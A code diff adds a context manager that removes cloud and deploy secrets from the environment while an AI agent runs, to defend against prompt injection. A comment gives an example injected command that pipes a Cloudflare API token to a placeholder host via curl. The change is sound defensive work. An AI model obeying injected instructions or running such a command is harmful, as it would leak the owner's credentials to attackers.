@@ -16,9 +16,11 @@ installed package, not guessed.
 """
 from __future__ import annotations
 
+import contextlib
 import os
 import subprocess
 import sys
+from collections.abc import Iterator
 from dataclasses import dataclass
 from pathlib import Path
 from typing import TYPE_CHECKING, Any, Callable, Literal, Optional, Sequence
@@ -196,13 +198,39 @@ _TRANSIENT = ("rate limit", "rate_limit", "ratelimit", "429", "529", "overloaded
               "connection reset", "connection refused")
 
 
+# Deploy/cloud secrets that must NOT be in the agent's terminal environment while
+# it processes UNTRUSTED content (cloned source, web research, a reverse-engineered
+# app). A prompt-injection in that content could otherwise `printf $CLOUDFLARE_API_TOKEN
+# | curl evil`. Deploy runs in a SEPARATE, non-agent phase (area/deploy/*), so
+# stripping these for the agent run doesn't break deploy. LLM/provider keys are NOT
+# stripped — the agent needs them to think.
+_AGENT_SECRET_ENV = (
+    "CLOUDFLARE_API_TOKEN", "CLOUDFLARE_ACCOUNT_ID", "CF_API_TOKEN", "CF_ACCOUNT_ID",
+    "VERCEL_TOKEN", "AREA_POSTGRES_URL", "POSTGRES_URL", "DATABASE_URL",
+    "KV_REST_API_URL", "KV_REST_API_TOKEN", "AREA_GUI_TOKEN", "GITHUB_TOKEN", "GH_TOKEN",
+)
+
+
+@contextlib.contextmanager
+def _scrubbed_agent_env() -> Iterator[None]:
+    """Remove deploy/cloud secrets from os.environ for the duration of an agent run
+    (restored on exit, including on error), so untrusted content the agent reads
+    can't exfiltrate them via the terminal tool. See `_AGENT_SECRET_ENV`."""
+    saved = {k: os.environ.pop(k) for k in _AGENT_SECRET_ENV if k in os.environ}
+    try:
+        yield
+    finally:
+        os.environ.update(saved)
+
+
 def _run_retry(conv: Conversation, *, tries: int = 5, base: float = 15.0) -> None:
     """conv.run() with exponential backoff on transient errors (rate-limit etc.)."""
     import time as _t
 
     for i in range(tries):
         try:
-            conv.run()
+            with _scrubbed_agent_env():
+                conv.run()
             return
         except Exception as e:  # noqa: BLE001
             msg = str(e).lower()
